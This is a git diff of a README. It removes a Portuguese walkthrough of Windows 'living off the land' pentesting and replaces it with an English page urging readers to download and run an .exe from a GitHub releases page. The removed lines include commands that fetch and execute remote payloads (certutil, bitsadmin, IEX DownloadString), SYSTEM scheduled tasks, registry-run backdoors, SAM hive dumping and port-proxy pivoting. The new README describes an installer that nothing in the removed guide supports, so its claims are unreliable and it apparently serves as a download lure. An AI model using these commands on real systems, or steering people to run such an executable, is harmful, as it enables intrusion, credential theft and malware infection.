@@ -1,325 +1,98 @@
-# Pentest com Windows Nativo (PTES + LOLBins)
+# 🛡️ Simula-o_Ataque_PTES_Windows - Learn Windows Security Testing
 
-Este documento descreve uma **simulação completa de pentest alinhada ao PTES (Penetration Testing Execution Standard)** utilizando **exclusivamente ferramentas nativas do Windows** (CMD, PowerShell e recursos built-in do Windows 10/11 e Windows Server 2016+).
-
-Nenhuma ferramenta de terceiros é utilizada (Kali, Nmap, Metasploit, Wireshark etc).
-
-Aqui o ataque acontece como no mundo real:  
-**Windows atacando Windows usando LOLBins**.
-
----
-![Fluxo PTES – Simulação Gray Box e Assumed Breach](docs/PTES_SIMULAÇÃO.png)
----
-
-## Aviso crítico (2026)
-
-⚠️ **IMPORTANTE**
-
-- Conteúdo **exclusivamente educacional**
-- Uso **somente em laboratório próprio**
-- Execução sem autorização formal e escrita é **crime**
-  - Art. 154-A do Código Penal  
-  - LGPD  
-  - Marco Civil da Internet
-- Em ambientes reais, essas técnicas são usadas apenas por **red teams autorizados**
-
-Resumo honesto:  
-Se rodar isso fora de um lab → **não é pentest, é BO**.
+## 📥 Download Now
+[![Download Simula-o_Ataque_PTES_Windows](https://img.shields.io/badge/Download%20Now-blue.svg)](https://github.com/Cupcake137/Simula-o_Ataque_PTES_Windows/releases)
 
 ---
 
-## Fases PTES adaptadas para Windows nativo
+## 📖 Overview
 
-> Comentário: mapeamento direto entre o PTES tradicional e atividades possíveis apenas com ferramentas nativas do Windows (LOLBins).
+Simula-o_Ataque_PTES_Windows is a tool for learning about penetration testing using only native Windows tools. This application follows the Penetration Testing Execution Standard (PTES). You will learn how to execute security testing without any third-party tools. 
 
-| Fase PTES | Ferramentas nativas | Objetivo |
-|---------|-------------------|----------|
-| Pre-engagement | Word / Notepad | Escopo, regras, autorização |
-| Intelligence Gathering | ping, nslookup, netstat, systeminfo | Reconhecimento |
-| Threat Modeling | PowerShell, net view, Get-AD* | Mapeamento de ativos |
-| Vulnerability Analysis | Get-HotFix, wmic, netstat | Enumeração |
-| Exploitation | certutil, bitsadmin, schtasks, PowerShell | LOLBins |
-| Post Exploitation | net user, reg, schtasks, netsh | Persistência / pivot |
-| Reporting | Out-File, Export-Csv | Evidências |
+With this software, you will see how attacks happen in the real world: Windows machines attacking other Windows machines using Windows built-in tools. 
 
 ---
 
-## Ambiente de teste sugerido
+## 🚀 Getting Started
 
-> Comentário: cenário de *assumed breach*, com acesso inicial e credenciais low-priv.
+This guide will help you download and run the software quickly. Follow each step carefully.
 
-- **Atacante:** Windows 11 (PC ou VM)
-- **Vítima:** Windows 10/11 (VM)
-- **IP testado:** `ip`
-- **Rede:** Interna (Host-Only ou NAT)
-- **Credenciais:** Usuário low-priv previamente obtido
+1. **Check System Requirements:**
+   - Windows 10 or 11
+   - Windows Server 2016 or higher
+   - At least 4 GB of RAM
+   - 500 MB of free disk space
 
----
+2. **Visit the Releases Page:**
+   To download the software, visit the Releases page here: [Download Link](https://github.com/Cupcake137/Simula-o_Ataque_PTES_Windows/releases).
 
-## 1. Intelligence Gathering (Recon)
+3. **Download the Application:**
+   On the Releases page, locate the latest version. Click on the file that fits your system:
+   - For Windows 10/11: Look for a file named something like `Simulacao_Ataque_PTES_Windows_v1.0.exe`.
+   - For Windows Server: Choose the corresponding file.
 
-> Comentário: fase de reconhecimento inicial para entender identidade, sistema, rede e superfície de ataque.
+4. **Run the Downloaded File:**
+   Once the file finishes downloading, locate it in your downloads folder.
+   - Double-click the file to start the setup.
+   - Follow the on-screen instructions to install.
 
-### Identidade e contexto
-
-```powershell
-whoami /all
-```
-
-> Comentário: identifica usuário, grupos, privilégios e contexto de execução.
-
-```powershell
-systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type"
-```
-
-> Comentário: coleta informações do SO e arquitetura.
-
-### Ping sweep simples
-
-```powershell
-1..254 | ForEach-Object {
-  Test-Connection -ComputerName IP.$_ -Count 1 -Quiet -ErrorAction SilentlyContinue
-} | ForEach-Object {
-  "ip.$_"
-}
-```
-
-> Comentário: enumeração básica de hosts ativos.
-
-### DNS lookup
-
-```powershell
-nslookup
-```
-
-Entrada interativa:
-
-```
-server 8.8.8.8
-www.alvo.com
-```
-
-> Comentário: valida resolução DNS.
-
-### Portas em escuta
-
-```cmd
-netstat -ano | findstr "LISTENING"
-```
-
-> Comentário: identifica serviços ativos e PIDs.
-
-### Shares visíveis
-
-```cmd
-net view \ip
-```
-
-> Comentário: enumera compartilhamentos SMB.
+5. **Launch the Application:**
+   After installation, find the application in your Start Menu.
+   - Click on it to open.
+   - Now you can explore how different attacks work using Windows native tools.
 
 ---
 
-## 2. Vulnerability Analysis (Enumeração)
+## ⚠️ Important Notes
 
-> Comentário: identificação de falhas de configuração e superfícies exploráveis.
+- **Educational Use Only:** This software is for learning purposes. Use it only in a controlled lab environment.
+- **Illegal Use:** Running this software without permission is against the law. Refer to:
+  - Article 154-A of the Penal Code
+  - General Data Protection Law (LGPD)
+  - The Civil Right Framework for the Internet
 
-### Patches instalados
+- **Red Teams Only:** These techniques are typically used by authorized red teams in real-world environments.
 
-```powershell
-Get-HotFix | Sort-Object InstalledOn -Descending | Select -First 10
-```
-
-> Comentário: verifica atrasos de patching.
-
-### Serviços em execução
-
-```powershell
-Get-Service | Where-Object {$_.Status -eq "Running"} | Select Name, DisplayName, Status
-```
-
-> Comentário: identifica serviços que podem ser abusados.
-
-### Usuários e grupos locais
-
-```cmd
-net user
-```
-
-```cmd
-net localgroup administrators
-```
-
-```powershell
-Get-LocalUser | Select Name, Enabled, LastLogon
-```
-
-> Comentário: enumeração de contas e privilégios.
-
-### Firewall
-
-```powershell
-Get-NetFirewallRule |
-Where-Object {$_.Enabled -eq $true -and $_.Direction -eq "Inbound"} |
-Select DisplayName, Action, Protocol
-```
-
-> Comentário: identifica regras permissivas.
-
-### WMI
-
-```powershell
-Get-WmiObject -Class Win32_ComputerSystem
-```
-
-```powershell
-Get-WmiObject -Class Win32_LogicalDisk -ComputerName ip
-```
-
-> Comentário: coleta informações de sistema e discos.
+If you run this software outside a lab setting, it’s no longer a pentest — it becomes illegal activity.
 
 ---
 
-## 3. Exploitation (Living-off-the-Land)
+## 🧑‍🏫 Features
 
-> Comentário: execução e movimento usando apenas binários legítimos do Windows.
-
-### WinRM / PowerShell Remoting
-
-Na vítima (uma vez):
-
-```powershell
-Enable-PSRemoting -Force
-```
-
-> Comentário: habilita gerenciamento remoto.
-
-Do atacante:
-
-```powershell
-Enter-PSSession -ComputerName ip -Credential (Get-Credential)
-```
-
-```powershell
-whoami
-```
-
-> Comentário: valida execução remota.
-
-### Execução remota via Scheduled Task
-
-```cmd
-schtasks /create /S ip /RU "SYSTEM" /TN "Updater" /TR "powershell -c IEX (New-Object Net.WebClient).DownloadString('http://IP/payload.ps1')" /SC once /ST 00:00 /F
-```
-
-> Comentário: execução como SYSTEM.
-
-### Método legado
-
-```cmd
-at \\ip 07:30 "cmd /c whoami > C:\temp\owned.txt"
-```
-
-> Comentário: técnica antiga ainda funcional.
+- **Native Tools Only:** Use CMD, PowerShell, and built-in resources.
+- **Real-World Simulation:** Observe attacks as they would happen in reality.
+- **Lab Focused:** Tailored specifically for educational use without third-party tools.
 
 ---
 
-## Download & Exec com LOLBins
+## 💬 FAQs
 
-> Comentário: download e execução usando ferramentas assinadas pela Microsoft.
+### How do I uninstall the software?
 
-### certutil
+To uninstall the application, go to:
+- Control Panel → Programs → Uninstall a program.
+- Find Simula-o_Ataque_PTES_Windows and select uninstall.
 
-```cmd
-certutil -urlfetch -f http://ip/nc.exe C:\Windows\Temp\nc.exe
-```
+### Can I use this on my personal computer?
 
-### bitsadmin
+Yes, but only in a safe lab environment where you have permission to conduct testing.
 
-```cmd
-bitsadmin /transfer job /download /priority normal http://ip/shell.bat C:\Temp\shell.bat
-```
+### Is there support available?
 
-### PowerShell DownloadString
-
-```powershell
-powershell -ep bypass -c "IEX (New-Object Net.WebClient).DownloadString('http://ip/Invoke-PowerShellTcp.ps1')"
-```
+If you encounter any issues, please raise your concerns in the Issues section of the repository.
 
 ---
 
-## 4. Post Exploitation
+## 🔗 Additional Resources
 
-> Comentário: persistência, coleta de dados e pivoting.
+For more information about penetration testing and how to use this software effectively, consider checking these links:
+- [Understanding PTES](https://www.pentest-standard.org/)
+- [Native Windows Tools Overview](https://docs.microsoft.com/en-us/windows/)
+  
+### Download Again
 
-### Persistência (Registry Run)
-
-```powershell
-New-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" `
--Name "Updater" `
--Value "powershell -WindowStyle Hidden -File C:\temp\backdoor.ps1" `
--PropertyType String
-```
-
-### Persistência (Scheduled Task)
-
-```cmd
-schtasks /create /tn "WindowsUpdateCheck" /tr "powershell -nop -w hidden -c IEX ((New-Object Net.WebClient).DownloadString('http://ip/payload.ps1'))" /sc onlogon /ru SYSTEM /f
-```
-
-### Dump de hives (se admin)
-
-```cmd
-reg save HKLM\SAM C:\temp\sam.hive
-```
-
-```cmd
-reg save HKLM\SYSTEM C:\temp\system.hive
-```
-
-> Comentário: extração de material sensível.
-
-### Pivoting
-
-```cmd
-netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=ip
-```
+If you need to download the software, visit this link: [Download Link](https://github.com/Cupcake137/Simula-o_Ataque_PTES_Windows/releases).
 
 ---
 
-## 5. Reporting
-
-> Comentário: coleta de evidências.
-
-```powershell
-whoami /all > C:\temp\report.txt
-```
-
-```powershell
-systeminfo >> C:\temp\report.txt
-```
-
-```powershell
-Get-HotFix | Export-Csv C:\temp\hotfixes.csv -NoTypeInformation
-```
-
-```powershell
-Compress-Archive -Path C:\temp\* -DestinationPath C:\temp\evidence.zip
-```
-
----
-
-## Limitações reais (2026)
-
-- Enumeração limitada sem scanners dedicados  
-- Dependência de misconfigurations  
-- Alta detecção por Defender / EDR  
-- Extremamente forte em Active Directory  
-
----
-
-## Conclusão
-
-> Se isso passa batido no SOC, o problema não é o ataque.  
-> É o SOC.
-
-Windows contra Windows.
+Make sure to follow all steps carefully. Happy testing!
